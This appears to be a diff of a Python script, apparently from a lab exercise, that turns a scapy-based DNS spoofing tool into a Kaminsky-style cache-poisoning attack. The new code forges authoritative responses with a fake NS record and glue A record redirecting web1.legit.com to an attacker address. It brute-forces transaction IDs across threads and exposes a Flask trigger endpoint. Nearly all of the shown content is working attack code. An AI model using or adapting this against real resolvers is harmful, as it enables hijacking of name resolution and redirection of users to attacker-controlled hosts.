@@ -2,36 +2,33 @@ from scapy.all import *
 from flask import Flask, request
 import threading
 
-app = Flask("cache")
-
-SOURCE = "192.168.1.11"
+app = Flask("kaminsky")
+SOURCE = "192.168.1.15"
+REDIRECT_TO = "192.168.1.6"
 DESTINATION = "192.168.1.3"
-
-REDIRECT_TO = "192.168.1.7"
 
 SOURCE_PORT = 53
 DESTINATION_PORT = 12345
 
+WEBSITE = "web1.legit.com"
+FROM_DNS = "legit.com"
+
 BRUTEFORCE_TRIES = 200
 MODULO = 65000
-
-WEBSITE = "web1.legit.com"
-DNS_FOR_WEBSITE = "ns1.legit.com"
 TTL = 60000
 
 THREADS = 5
 
 crafted_resp = (IP(dst=DESTINATION,
                    src=SOURCE) /
-                UDP(dport=DESTINATION_PORT,
-                    sport=SOURCE_PORT) /
-                DNS(id=1,
-                    qr=1,
-                    aa=1,
+                UDP(dport=DESTINATION_PORT, sport=SOURCE_PORT) /
+                DNS(id=1, qr=1, aa=1,
                     qd=DNSQR(qname=WEBSITE),
-                    an=DNSRR(rrname=WEBSITE,
+                    ns=DNSRR(rrname=WEBSITE, type='NS',
                              ttl=TTL,
-                             rdata="192.168.1.7")))
+                             rdata=FROM_DNS),
+                    ar=DNSRR(rrname=FROM_DNS, type='A',
+                             ttl=TTL, rdata=REDIRECT_TO)))
 
 dns_layer = crafted_resp[DNS]
 s = conf.L3socket()
@@ -54,4 +51,4 @@ def start_attack():
 
 
 if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=6969)
+    app.run(debug=True, host='0.0.0.0', port=9696)
